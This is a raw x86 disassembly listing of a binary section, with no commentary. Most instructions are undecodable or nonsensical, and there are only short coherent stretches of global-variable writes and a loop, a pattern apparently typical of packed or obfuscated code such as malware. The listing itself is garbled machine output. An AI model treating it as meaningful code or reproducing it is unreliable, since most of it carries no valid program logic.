  407a1b:	push   esp
  407a1c:	xor    DWORD PTR [edx],edi
  407a1e:	mov    bh,0x4
  407a20:	stos   DWORD PTR es:[edi],eax
  407a21:	mov    edx,0xaf40e0fe
  407a26:	mov    ds:0xaf685d2a,eax
  407a2b:	fdivr  QWORD PTR [edi+0x2b]
  407a2e:	lods   al,BYTE PTR ds:[esi]
  407a2f:	fldenv [edx-0x67]
  407a32:	push   eax
  407a33:	jp     0x407a61
  407a35:	xchg   ebp,eax
  407a36:	int    0xe
  407a38:	mov    esi,0x37cbdba5
  407a3d:	loope  0x407a9f
  407a3f:	mov    ebp,0xe96eb8ee
  407a44:	stos   BYTE PTR es:[edi],al
  407a45:	adc    eax,0x2faf12e3
  407a4a:	push   eax
  407a4b:	add    DWORD PTR [edi-0x4ce66d66],esi
  407a51:	jl     0x4079fa
  407a53:	add    eax,DWORD PTR ds:0xe7766dea
  407a59:	xor    DWORD PTR [edx-0x1bc5e678],esp
  407a5f:	push   ebx
  407a60:	scas   eax,DWORD PTR es:[edi]
  407a61:	sar    dl,cl
  407a63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a64:	stos   BYTE PTR es:[edi],al
  407a65:	and    BYTE PTR [edx],dh
  407a67:	and    eax,0xe3d7b68
  407a6c:	mov    al,ds:0x35161cbb
  407a71:	(bad)  
  407a72:	adc    al,0x78
  407a74:	into   
  407a75:	mov    dh,0xbd
  407a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a78:	add    BYTE PTR gs:[ebp-0x1],ch
  407a7c:	push   ss
  407a7d:	xor    DWORD PTR [edi],eax
  407a7f:	sbb    ch,dh
  407a81:	jge    0x407a98
  407a83:	xor    al,0x2a
  407a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a86:	lock in eax,0xbc
  407a89:	dec    esi
  407a8a:	or     ebp,ebx
  407a8c:	pop    ebx
  407a8d:	sbb    dl,cl
  407a8f:	ror    BYTE PTR [edi+0x40e42aa7],cl
  407a95:	retf   0xe1de
  407a98:	cmp    DWORD PTR [ebx],esp
  407a9a:	jp     0x407a6f
  407a9c:	retf   
  407a9d:	pop    ss
  407a9e:	xor    al,0x72
  407aa0:	sahf   
  407aa1:	mov    edi,0x859a90b0
  407aa6:	cmp    al,0x1
  407aa8:	cwde   
  407aa9:	xchg   ebp,eax
  407aaa:	sub    DWORD PTR [eax],0x923e2d47
  407ab0:	arpl   cx,bp
  407ab2:	adc    eax,0xc852dced
  407ab7:	cld    
  407ab8:	les    esp,FWORD PTR [eax+ebx*4]
  407abb:	push   ecx
  407abc:	les    ebp,FWORD PTR [esi-0x604cc45]
  407ac2:	fidivr WORD PTR [edi]
  407ac4:	fst    st(1)
  407ac6:	cmp    eax,0xc231d7cb
  407acb:	and    eax,0x3d56ea46
  407ad0:	jmp    0x8978d344
  407ad5:	push   ecx
  407ad6:	lea    ebp,[esi+0x13]
  407ad9:	ins    BYTE PTR es:[edi],dx
  407ada:	mov    ds:0x5d363a70,al
  407adf:	ins    DWORD PTR es:[edi],dx
  407ae0:	mov    al,ds:0xa9004c8c
  407ae5:	arpl   si,bp
  407ae7:	jmp    0x54c0:0xfbbfcfb2
  407aee:	fild   DWORD PTR ds:0xdaaf49ab
  407af4:	jne    0x407b0f
  407af6:	lods   al,BYTE PTR ds:[esi]
  407af7:	adc    BYTE PTR [ebx+0x45],0x70
  407afb:	retf   
  407afc:	xchg   edx,eax
  407afd:	(bad)  
  407afe:	sub    edi,DWORD PTR [ecx]
  407b00:	popf   
  407b01:	and    esp,ebp
  407b03:	jo     0x407b2c
  407b05:	rol    ebp,0x20
  407b08:	jae    0x407b2a
  407b0a:	jle    0x407b1b
  407b0c:	in     al,0x4d
  407b0e:	cmp    al,0x93
  407b10:	or     DWORD PTR [eax+0xcbafbb8],edx
  407b16:	shl    BYTE PTR [edx],cl
  407b18:	push   esp
  407b19:	iret   
  407b1a:	inc    ebp
  407b1b:	or     eax,0xc5994992
  407b20:	mov    WORD PTR cs:[eax+0x69],?
  407b24:	bound  ebp,QWORD PTR ds:[edi-0x449677b5]
  407b2b:	fist   DWORD PTR ss:[edi]
  407b2e:	cmp    ecx,eax
  407b30:	jne    0x407efc
  407b36:	mov    ax,WORD PTR [ebp-0x8]
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433723,0x433767
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433803,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43372b,0x433827
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43383b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4337fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0x70f6a3a4,al
  407ba8:	dec    eax
  407ba9:	es push ds
  407bab:	js     0x407b78
  407bad:	jle    0x407c2d
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407b9d
  407bb4:	aaa    
  407bb5:	or     al,0x3f
  407bb7:	test   DWORD PTR [eax],edx
  407bb9:	sub    al,0xaf
  407bbb:	test   esi,ecx
  407bbd:	std    
  407bbe:	fsubr  st(7),st
  407bc0:	mov    ds:0x8fdc392c,al
  407bc5:	pop    ebx
  407bc6:	out    0x87,al
  407bc8:	scas   al,BYTE PTR es:[edi]
  407bc9:	dec    edi
  407bca:	jne    0x407bbb
  407bcc:	pop    edi
  407bcd:	shl    DWORD PTR [ecx+0x4d3fb571],1
  407bd3:	mov    edx,DWORD PTR [ecx-0x68]
  407bd6:	or     BYTE PTR [ebp+0x1d],ch
  407bd9:	xchg   ecx,eax
  407bda:	ins    BYTE PTR es:[edi],dx
  407bdb:	ins    BYTE PTR es:[edi],dx
  407bdc:	enter  0x784f,0x4e
  407be0:	rol    BYTE PTR [eax],cl
  407be2:	xchg   ecx,eax
  407be3:	dec    eax
  407be4:	xor    ah,BYTE PTR [edx]
  407be6:	pop    ecx
  407be7:	adc    DWORD PTR [esi+0x15],0xffffffa7
  407beb:	loop   0x407bcf
  407bed:	xor    bl,BYTE PTR [esi+0x65b0d44c]
  407bf3:	push   ebx
  407bf4:	sub    eax,0xf9ea615b
  407bf9:	sbb    eax,0x5f78f3e7
  407bfe:	sbb    al,0xab
  407c00:	jl     0x407c5e
  407c02:	test   BYTE PTR [esi-0x5d],dh
  407c05:	mov    dl,0xc1
  407c07:	cmp    eax,DWORD PTR [ebp+0x6649d93b]
  407c0d:	xchg   edx,eax
  407c0e:	xor    BYTE PTR [ebx+0x3f5afa08],dh
  407c14:	(bad)  
  407c15:	aaa    
  407c16:	xlat   BYTE PTR ds:[ebx]
  407c17:	sub    BYTE PTR [ecx],dh
  407c19:	(bad)  
  407c1b:	dec    ebp
  407c1c:	pop    ecx
  407c1d:	xchg   DWORD PTR [eax-0x6b],ebp
  407c20:	sbb    al,0x81
  407c22:	addr16 enter 0x99fe,0xfa
  407c27:	enter  0x1147,0xdf
  407c2b:	fist   DWORD PTR [ebx]
  407c2d:	cmp    DWORD PTR fs:[edx*8-0x63df1201],0xffffffe0
  407c36:	sbb    al,0x7b
  407c38:	cld    
  407c39:	fiadd  DWORD PTR [esp+edi*8-0x21ffa21c]
  407c40:	and    esp,DWORD PTR [ebx-0x27c889bf]
  407c46:	push   es
  407c47:	andnps xmm5,XMMWORD PTR [ecx+0x52]
  407c4b:	ds fmul st(3),st
  407c4e:	fild   DWORD PTR [esp+edi*2+0x5]
  407c52:	adc    eax,0xce538717
  407c57:	loop   0x407cd5
  407c59:	add    DWORD PTR [esi],0xce44d057
  407c5f:	int    0xb1
  407c61:	mov    edx,0x1dfd8042
  407c66:	sbb    ah,dl
  407c68:	call   0x631a4e64
  407c6d:	xor    BYTE PTR [esi+0x79],bl
  407c70:	pop    eax
  407c71:	sub    DWORD PTR ds:0x5e3c0db9,esp
  407c77:	cli    
  407c78:	popf   
  407c79:	call   0x55133b68
  407c7e:	xchg   ebp,eax
  407c7f:	jle    0x407c37
  407c81:	std    
  407c82:	mov    ds:0x8dbc396d,al
  407c87:	adc    al,0x1b
  407c89:	js     0x407cb6
  407c8b:	test   ecx,ebx
  407c8d:	in     eax,0x8d
  407c8f:	arpl   WORD PTR [ebp+0xb50902],cx
  407c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c96:	fwait
  407c97:	and    dl,BYTE PTR [ecx]
  407c99:	ret    
  407c9a:	aam    0x58
  407c9c:	aad    0x68
  407c9e:	nop
  407c9f:	scas   eax,DWORD PTR es:[edi]
  407ca0:	shr    ch,1
  407ca2:	sbb    al,0xcc
  407ca4:	mov    WORD PTR [ebp+0x3c5615eb],?
  407caa:	cmp    BYTE PTR [esi-0x29],ch
  407cad:	stc    
  407cae:	imul   edx,DWORD PTR [edx+0x4ffc4dc4],0x7cb2f3bd
  407cb8:	loope  0x407c93
  407cba:	lods   al,BYTE PTR ds:[esi]
  407cbb:	dec    ebx
  407cbc:	loopne 0x407c5d
  407cbe:	inc    ebx
  407cbf:	jl     0x407c62
  407cc1:	jo     0x407cf2
  407cc3:	stos   DWORD PTR es:[edi],eax
  407cc4:	into   
  407cc5:	das    
  407cc6:	clc    
  407cc7:	arpl   WORD PTR [edi+0x4381281d],dx
  407ccd:	sbb    dh,BYTE PTR [ebp+0x28ed3cef]
  407cd3:	(bad)  
  407cd4:	scas   eax,DWORD PTR es:[edi]
  407cd5:	or     eax,0xf6c9d246
  407cda:	leave  
  407cdb:	sbb    BYTE PTR [ecx+ebx*4+0x598cf7a2],ah
  407ce2:	hlt    
  407ce3:	rcr    esi,1
  407ce5:	std    
  407ce6:	mov    bl,0xd6
  407ce8:	dec    ecx
  407ce9:	(bad)  [ecx+0x3b]
  407cec:	cmp    ebx,DWORD PTR [esi]
  407cee:	pushf  
  407cef:	sar    esi,0x14
  407cf2:	xchg   BYTE PTR [eax-0x55],dl
  407cf5:	jo     0x407d4e
  407cf7:	adc    DWORD PTR [ebx+0x26],edx
  407cfa:	push   es
  407cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cfc:	pop    ds
  407cfd:	push   ebp
  407cfe:	js     0x407cd5
  407d00:	inc    ebp
  407d01:	leave  
  407d02:	out    dx,eax
  407d03:	cld    
  407d04:	dec    ebx
  407d05:	jbe    0x407d08
  407d07:	sub    BYTE PTR [ebx+edi*4+0x4e9b79de],bh
  407d0e:	xlat   BYTE PTR ds:[ebx]
  407d0f:	mov    ds:0x274ceb4b,eax
  407d14:	in     al,0x8d
  407d16:	jmp    FWORD PTR [ecx+eiz*8+0x53]
  407d1a:	ja     0x407ce2
  407d1c:	jmp    0x407cd7
  407d1e:	dec    eax
  407d1f:	enter  0xd128,0x15
  407d23:	test   al,0x2b
  407d25:	lahf   
  407d26:	push   ecx
  407d27:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407d29:	xchg   BYTE PTR [ecx],bl
  407d2b:	add    cl,BYTE PTR [ebp+0x1ade89e4]
  407d31:	outs   dx,BYTE PTR ds:[esi]
  407d32:	add    DWORD PTR [eax-0xdb1526c],0x4a617dd1
  407d3c:	push   ebx
  407d3d:	xor    DWORD PTR [eax+0x64],esi
  407d40:	ds push esp
  407d42:	iret   
  407d43:	sbb    DWORD PTR [ebp-0x7c97431a],ebx
  407d49:	mov    dl,0xff
  407d4b:	xor    al,0x71
  407d4d:	pop    ds
  407d4e:	xor    al,0xe1
  407d50:	fbld   TBYTE PTR ds:0xb90d3edc
  407d56:	rcl    BYTE PTR [ecx],0x83
  407d59:	add    edi,DWORD PTR [edi+edx*2-0x42]
  407d5d:	and    eax,0x365f1015
  407d62:	jns    0x407d25
  407d64:	mov    ebp,0x5f330f53
  407d69:	push   ebx
  407d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d6b:	push   ebp
  407d6c:	sbb    al,0x36
  407d6e:	xor    ax,0x4a27
  407d72:	inc    esi
  407d73:	cmp    ecx,DWORD PTR [edi]
  407d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d76:	mov    ch,0x90
  407d78:	jle    0x407ded
  407d7a:	cld    
  407d7b:	mov    ds:0x90dbf770,eax
  407d80:	jns    0x407dd0
  407d82:	sub    esp,eax
  407d84:	or     al,0xc5
  407d86:	add    esi,DWORD PTR [edi]
  407d88:	aaa    
  407d89:	fwait
  407d8a:	jne    0x407e03
  407d8c:	xor    DWORD PTR [eax+0x3f2fe383],esi
  407d92:	and    DWORD PTR [esi],0x617722fe
  407d98:	shl    DWORD PTR [edx+ecx*8+0x9],0xbb
  407d9d:	mov    ds:0x256c423,al
  407da2:	xor    BYTE PTR [ebp+0x2c],dl
  407da5:	ss push ds
  407da7:	jle    0x407d5a
  407da9:	xor    DWORD PTR [ebp-0x21],ecx
  407dac:	xchg   ecx,eax
  407dad:	xor    eax,0xaabdc979
  407db2:	sub    esp,esi
  407db4:	sub    bh,BYTE PTR [ebp+edx*8-0x66ebaa88]
  407dbb:	(bad)  
  407dbc:	retf   
  407dbd:	jmp    0x125c:0x133b48eb
  407dc4:	mov    cl,0x9c
  407dc6:	pop    esi
  407dc7:	in     eax,dx
  407dc8:	add    al,0xbe
  407dca:	push   ebp
  407dcb:	push   ecx
  407dcc:	inc    ecx
  407dcd:	fld    QWORD PTR [eax+0x27]
  407dd0:	aam    0x27
  407dd2:	inc    esi
  407dd3:	jecxz  0x407d69
  407dd5:	dec    esp
  407dd6:	and    BYTE PTR [ecx],bh
  407dd8:	ins    DWORD PTR es:[edi],dx
  407dd9:	sahf   
  407dda:	push   eax
  407ddb:	fild   QWORD PTR [eax]
  407ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dde:	nop
  407ddf:	push   ebp
  407de0:	sub    BYTE PTR ds:0x1dd1b34a,al
  407de6:	retf   
  407de7:	ds retf 0x71cf
  407deb:	(bad)  
  407dec:	xchg   esi,eax
  407ded:	sub    esp,DWORD PTR [edi+0x545186f4]
  407df3:	(bad)  
  407df4:	dec    esi
  407df5:	push   edx
  407df6:	dec    ebp
  407df7:	adc    dh,al
  407df9:	sub    DWORD PTR [esi-0x463cd18e],esp
  407dff:	(bad)
  407e02:	mov    bh,0xc3
  407e04:	aam    0x6b
  407e06:	stos   BYTE PTR es:[edi],al
  407e07:	add    cl,cl
  407e09:	sub    BYTE PTR [eax],ah
  407e0b:	mov    edi,0x19565199
  407e10:	xor    al,0xa8
  407e12:	(bad)  
  407e13:	iret   
  407e14:	sahf   
  407e15:	inc    BYTE PTR [esi+0x39]
  407e18:	shr    DWORD PTR [edx+edi*4],1
  407e1b:	push   esp
  407e1c:	sub    ch,ah
  407e1e:	jmp    0x1e69:0xee2d921f
  407e25:	pop    ss
  407e26:	shr    BYTE PTR [ebx-0x77],cl
  407e29:	(bad)  
  407e2b:	mov    ch,0x25
  407e2d:	rcr    ebx,1
  407e2f:	outs   dx,DWORD PTR ds:[esi]
  407e30:	jg     0x407e00
  407e32:	fwait
  407e33:	add    DWORD PTR [ebp+0x2f611349],edx
  407e39:	mov    ecx,0x332aaff7
  407e3e:	dec    esi
  407e3f:	repnz sbb esi,esi
  407e42:	scas   eax,DWORD PTR es:[edi]
  407e43:	mov    dl,0xab
  407e45:	lahf   
  407e46:	addr16 pop ebp
  407e48:	lods   eax,DWORD PTR ds:[esi]
  407e49:	daa    
  407e4a:	pushf  
  407e4b:	jns    0x407e71
  407e4d:	xor    dh,BYTE PTR [ebx]
  407e4f:	scas   eax,DWORD PTR es:[edi]
  407e50:	test   DWORD PTR [esi+0x7c],ebx
  407e53:	out    0xf8,eax
  407e55:	push   edi
  407e56:	sbb    al,0x92
  407e58:	fucom  st(6)
  407e5a:	into   
  407e5b:	and    ecx,0xad62917
  407e61:	or     ebx,DWORD PTR [ecx-0x6d]
  407e64:	(bad)  
  407e65:	pop    edx
  407e66:	and    eax,0xd33a70e
  407e6b:	cld    
  407e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e6d:	push   edi
  407e6e:	out    0x1c,eax
  407e70:	pop    ss
  407e71:	cwde   
  407e72:	jae    0x407e33
  407e74:	push   ss
  407e75:	movntps XMMWORD PTR ds:[edx+0x379b7e6e],xmm7
  407e7d:	dec    edx
  407e7e:	and    al,0xaf
  407e80:	inc    esi
  407e81:	cmp    edi,0x66e66c0a
  407e87:	pslld  mm1,QWORD PTR [edx]
  407e8a:	adc    ebp,DWORD PTR [ebx+esi*8-0x79f1b53b]
  407e91:	js     0x407eae
  407e93:	or     DWORD PTR [eax-0x43],esp
  407e96:	push   esp
  407e97:	iret   
  407e98:	pop    edi
  407e99:	jmp    0x407edf
  407e9b:	adc    eax,0x856d165f
  407ea0:	in     al,0x3a
  407ea2:	dec    edi
  407ea3:	sbb    al,0xd1
  407ea5:	mov    dh,0x9d
  407ea7:	push   ss
  407ea8:	xchg   esp,eax
  407ea9:	mov    edx,0xcb2bc597
  407eae:	xor    al,0xc5
  407eb0:	mov    bl,0xa2
  407eb2:	sbb    ch,BYTE PTR [ecx-0x9]
  407eb5:	and    DWORD PTR [ecx+0x5f],eax
  407eb8:	leave  
  407eb9:	mov    bl,0x4
  407ebb:	loopne 0x407eac
  407ebd:	int    0xfc
  407ebf:	outs   dx,DWORD PTR ds:[esi]
  407ec0:	div    BYTE PTR ds:0xa6d4daff
  407ec6:	(bad)  
  407ec7:	push   esp
  407ec8:	xlat   BYTE PTR ds:[ebx]
  407ec9:	mov    edx,0x5ef18398
  407ece:	ja     0x407ebe
  407ed0:	xlat   BYTE PTR ds:[ebx]
  407ed1:	jmp    0x136f2937
  407ed6:	mov    ecx,0xd34223dc
  407edb:	dec    esi
  407edc:	jge    0x407e76
  407ede:	test   DWORD PTR [ebp+edx*8-0x47038a7f],ebx
  407ee5:	sahf   
  407ee6:	adc    al,0xe
  407ee8:	mov    ax,WORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43376f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	ss iret 
  407f1f:	inc    ebp
  407f20:	ja     0x407f4c
  407f22:	(bad)  
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	(bad)  [ecx]
  407f2b:	in     al,dx
  407f2c:	aas    
  407f2d:	jmp    0xdd27:0x14bf3292
  407f34:	dec    ebp
  407f35:	inc    eax
  407f36:	adc    esi,DWORD PTR [ecx]
  407f38:	sub    ch,cl
  407f3a:	out    0x84,eax
  407f3c:	fistp  WORD PTR [ebp+0x642144e2]
  407f42:	jnp    0x407ed4
  407f44:	fwait
  407f45:	push   0x4148b1ac
  407f4a:	cmp    eax,edx
  407f4c:	xchg   ebx,eax
  407f4d:	inc    eax
  407f4e:	cwde   
  407f4f:	pop    ebx
  407f50:	inc    ebx
  407f51:	(bad)  
  407f52:	jg     0x407efd
  407f54:	jno    0x407fb1
  407f56:	xchg   edi,eax
  407f57:	sub    DWORD PTR [edx+0x6989cefc],esi
  407f5d:	ret    
  407f5e:	xor    al,0x23
  407f60:	sub    bh,0x96
  407f63:	std    
  407f64:	dec    esi
  407f65:	lods   al,BYTE PTR ds:[esi]
  407f66:	test   eax,0x5d6b738d
  407f6b:	xchg   ebx,eax
  407f6c:	xchg   esp,eax
  407f6d:	push   ebp
  407f6e:	and    BYTE PTR [esi-0x10a00d09],0xab
  407f75:	inc    edi
  407f76:	and    cl,bh
  407f78:	xchg   edi,eax
  407f79:	dec    ebp
  407f7a:	sahf   
  407f7b:	in     eax,dx
  407f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f7d:	ja     0x407f0b
  407f7f:	jo     0x407f2c
  407f81:	jno    0x407f84
  407f83:	mov    al,ds:0xb491a41e
  407f88:	call   0x1f05:0xfe709de1
  407f8f:	mov    ds:0x18a02392,eax
  407f94:	popa   
  407f95:	jae    0x407f2e
  407f97:	in     eax,0x8
  407f99:	int    0x28
  407f9b:	std    
  407f9c:	or     eax,0xc0cbbb00
  407fa1:	and    bl,BYTE PTR [ebp+edx*2+0x3]
  407fa5:	arpl   sp,dx
  407fa7:	inc    ebx
  407fa8:	jg     0x407f4a
  407faa:	and    ah,ah
  407fac:	sub    ecx,DWORD PTR [esi+0x50]
  407faf:	add    bh,0xb2
  407fb2:	lock mov al,ds:0x76c3535c
  407fb8:	outs   dx,BYTE PTR ds:[esi]
  407fb9:	xor    dh,ch
  407fbb:	ins    DWORD PTR es:[edi],dx
  407fbc:	and    cl,BYTE PTR [edx+0x661575e4]
  407fc2:	jg     0x40803c
  407fc4:	loope  0x407f62
  407fc6:	popa   
  407fc7:	sbb    BYTE PTR [edx+ecx*4-0x1caf571f],ch
  407fce:	fwait
  407fcf:	cmp    DWORD PTR [edi+ebx*8],edi
  407fd2:	sbb    DWORD PTR [eax-0xb],ecx
  407fd5:	repnz outs dx,BYTE PTR ss:[esi]
  407fd8:	data16 jne 0x407ffc
  407fdb:	call   0x61d56900
  407fe0:	aam    0x49
  407fe2:	addr16 add eax,0xbe8b55e5
  407fe8:	outs   dx,DWORD PTR ds:[esi]
  407fe9:	mov    es,WORD PTR [eax-0xb7d7bca]
  407fef:	and    dh,BYTE PTR [ebx+0x5d]
  407ff2:	popa   
  407ff3:	lods   eax,DWORD PTR ds:[esi]
  407ff4:	outs   dx,BYTE PTR ds:[esi]
  407ff5:	pop    eax
  407ff6:	fnstsw WORD PTR [esi]
  407ff8:	push   ebp
  407ff9:	cdq    
  407ffa:	sub    ebp,DWORD PTR [ebp+eiz*8-0x3a]
  407ffe:	add    al,0xf9
  408000:	int    0xfc
  408002:	add    edi,DWORD PTR [ecx-0x58]
  408005:	mov    ds:0x44304bc,eax
  40800a:	fidiv  DWORD PTR [eax+0x5b4b8604]
  408010:	fidiv  DWORD PTR [ebp-0x1c]
  408013:	out    dx,eax
  408014:	xor    ecx,edi
  408016:	add    dh,BYTE PTR [eax-0x64]
  408019:	in     al,dx
  40801a:	cmp    edx,DWORD PTR ds:0x45f931d8
  408020:	(bad)  
  408021:	push   cs
  408022:	(bad)  
  408023:	icebp  
  408024:	repz in al,dx
  408026:	fistp  WORD PTR [ecx]
  408028:	mov    ebx,0x8ee5a8a0
  40802d:	cmp    DWORD PTR [eax+0x22bf1cfa],edi
  408033:	push   ebx
  408034:	jp     0x40800f
  408036:	pop    esp
  408037:	cld    
  408038:	enter  0x3acc,0xc3
  40803c:	adc    dl,BYTE PTR [edi]
  40803e:	push   ebx
  40803f:	mov    al,ds:0xeb420d1
  408044:	fild   DWORD PTR [edi]
  408047:	fisub  DWORD PTR [edi-0x1afd810a]
  40804d:	mov    cl,0xa8
  40804f:	and    DWORD PTR [ebx-0x706a9a82],edi
  408055:	inc    ecx
  408056:	jmp    0x408097
  408058:	pop    es
  408059:	xor    edi,DWORD PTR [esp+eax*4+0x33bc254d]
  408060:	popf   
  408061:	xchg   ebx,eax
  408062:	mov    eax,0x3ae62785
  408067:	rcr    cl,0xda
  40806a:	cmp    edx,0x74713a85
  408070:	xor    ch,BYTE PTR [esp+ebx*1-0xd3e2dc5]
  408077:	jno    0x408049
  408079:	bound  ebp,QWORD PTR [edi]
  40807b:	sub    DWORD PTR [ebx],ebp
  40807d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40807e:	xchg   ebp,eax
  40807f:	push   edi
  408080:	and    DWORD PTR [ebp-0x47],eax
  408083:	sahf   
  408084:	(bad)  
  408086:	fcomp  DWORD PTR [bp+di]
  408089:	mov    ?,WORD PTR [eax]
  40808b:	xor    esp,DWORD PTR [edi+edi*2]
  40808e:	xchg   edi,eax
  408090:	bound  edi,QWORD PTR [eax]
  408092:	push   edx
  408093:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40809a:	inc    ecx
  40809b:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4080a2:	mov    eax,0x9577
  4080a7:	mov    ecx,DWORD PTR ds:0x433727
  4080ad:	xor    DWORD PTR ds:0x433833,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433837
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4337fb
  4080d7:	add    ecx,DWORD PTR ds:0x43371b
  4080dd:	mov    DWORD PTR ds:0x4337fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433767,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433783,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43371f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4337b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4337b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4337b3,eax
  408121:	cmp    DWORD PTR ds:0x4337b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4337b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4337b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4337b3
  408158:	inc    eax
  408159:	mov    ds:0x4337b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43376b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0x251f0c8b
  40818c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40818d:	nop
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	dec    ecx
  408196:	mov    ebp,0xd0a49473
  40819b:	jge    0x4081ee
  40819d:	pusha  
  40819e:	ret    
  40819f:	pop    es
  4081a0:	ds pop esi
  4081a2:	xor    DWORD PTR [ebp-0x1280affc],ebp
  4081a8:	shl    DWORD PTR [ebx],cl
  4081aa:	inc    DWORD PTR [edi]
  4081ac:	sbb    bh,BYTE PTR [ebp+0x45]
  4081af:	or     bh,BYTE PTR [eax]
  4081b1:	xchg   DWORD PTR [ecx-0x5],esp
  4081b4:	mov    edi,DWORD PTR [ebp-0x57]
  4081b7:	das    
  4081b8:	sub    edx,DWORD PTR [ecx+0x6]
  4081bb:	(bad)  
  4081bc:	and    ebp,DWORD PTR [ecx+0x65621d42]
  4081c2:	out    dx,eax
  4081c3:	(bad)  
  4081c4:	pop    edi
  4081c5:	jo     0x40820e
  4081c7:	jl     0x408176
  4081c9:	pop    esi
  4081ca:	test   BYTE PTR [edi-0x36],ch
  4081cd:	jecxz  0x40821b
  4081cf:	jae    0x40823f
  4081d1:	push   ecx
  4081d2:	xor    dh,BYTE PTR [esi-0x2665d00c]
  4081d8:	push   ebx
  4081d9:	mov    esp,0x1d998700
  4081de:	inc    ecx
  4081df:	das    
  4081e0:	pop    eax
  4081e1:	sar    edi,0x15
  4081e4:	stos   DWORD PTR es:[edi],eax
  4081e5:	jbe    0x4081f9
  4081e7:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4081e9:	sbb    ecx,DWORD PTR ds:[edx]
  4081ec:	and    BYTE PTR ds:0x1bb66ea,ch
  4081f2:	rcl    ebx,cl
  4081f4:	and    DWORD PTR [edi],0x4b313f19
  4081fa:	push   esi
  4081fb:	aaa    
  4081fc:	inc    ebx
  4081fd:	js     0x4081b1
  4081ff:	adc    ecx,DWORD PTR [ebx+0x11]
  408202:	cmp    ebx,DWORD PTR [edi+0x76]
  408205:	dec    eax
  408206:	call   0xe7f8:0xb36d09c7
  40820d:	(bad)  
  40820e:	adc    al,0x16
  408210:	dec    ebp
  408211:	xlat   BYTE PTR ds:[ebx]
  408212:	repz adc edx,ecx
  408215:	or     ebx,ebx
  408217:	sub    al,0x90
  408219:	cmc    
  40821a:	adc    eax,DWORD PTR [esi]
